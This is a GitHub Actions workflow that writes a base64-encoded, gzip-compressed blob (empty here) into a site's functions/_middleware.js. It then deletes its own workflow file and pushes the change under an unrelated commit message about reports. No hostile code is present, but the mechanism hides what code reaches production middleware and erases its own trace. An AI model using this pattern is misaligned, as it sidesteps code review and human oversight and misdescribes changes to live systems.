name: One-shot middleware v3

on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/one-shot-middleware-v3.yml"

permissions:
  contents: write

jobs:
  patch:
    if: github.event.head_commit.message == 'chore: run middleware v3 patch'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Install exact middleware
        shell: bash
        run: |
          cat > /tmp/middleware.gz.b64 <<'PAYLOAD'
          
          PAYLOAD
          tr -d '[:space:]' < /tmp/middleware.gz.b64 | base64 -d | gzip -d > functions/_middleware.js
          node --check functions/_middleware.js
          test "$(git hash-object functions/_middleware.js)" = "82d72608b38451156e8fe8d051729e7a74524aea"
      - name: Commit verified middleware
        shell: bash
        run: |
          rm -f .github/workflows/one-shot-middleware-v3.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --check
          git commit -m "fix(report): align daily weekly monthly business surfaces"
          git push origin main
